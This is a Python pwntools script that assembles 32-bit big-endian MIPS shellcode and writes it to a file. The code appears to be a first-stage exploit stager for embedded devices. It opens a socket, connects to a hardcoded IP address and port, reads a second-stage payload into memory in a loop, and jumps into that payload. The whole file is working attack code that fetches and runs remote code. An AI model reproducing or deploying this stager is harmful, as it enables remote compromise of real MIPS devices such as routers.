from pwn import *
import argparse

parser = argparse.ArgumentParser()
parser.add_argument('--name', help='output name of stage1 shellcode',required=True)

args = parser.parse_args()
name = args.name


context.clear()
context.arch = 'mips'
context.bits = 32
context.endian = 'big'

shellcode = '''
 add $s6, $s5, $0 
 not $a0, $s1
 slti $a2, $zero, 0xFFFF /* $a2 = 0 */
 ori $v0, $zero, SYS_socket
 sw $a0, -4($sp) /* mov $a1, $a0 */
 lw $a1, -4($sp)
 syscall 0x40404
 sw $v0, -4($sp) /* mov $s0, $v0 */
 lw $s0, -4($sp)
 li $s7, ~0x201bc
 not $t1, $s7
 sw $t1, -8($sp)
 li $s7, ~0xa000001
 not $t1, $s7
 sw $t1, -4($sp)
 addiu $sp, $sp, -8
 sw $s0, -4($sp) /* mov $a0, $s0 */
 lw $a0, -4($sp)
 add $a1, $sp, $0 /* mov $a1, $sp */
 li $s7, ~0x10
 not $a2, $s7
 ori $v0, $zero, SYS_connect
 syscall 0x40404
 li $s7, ~0xf8  /* size of payload !! */
 not $s3, $s7
read_loop_8:
   sw $s0, -4($sp) /* mov $a0, $s0 */
   lw $a0, -4($sp)
   add $a1, $s5, $0 /* mov $a1, $s5 */
   add $a2, $s3, $0 /* mov $a2, $s3 */
   ori $v0, $zero, (SYS_read)
   syscall 0x40404
   sub $s3, $s3, $v0
   bne $s3, $zero, read_loop_8
   add $s5, $s5, $v0

   add $t9, $s4, $0
   jalr $t9
   not $a0, $s2 
   jalr $s6 
'''

a = asm(shellcode)

o = open(name,'wb')
o.write(a)
o.flush()
o.close()

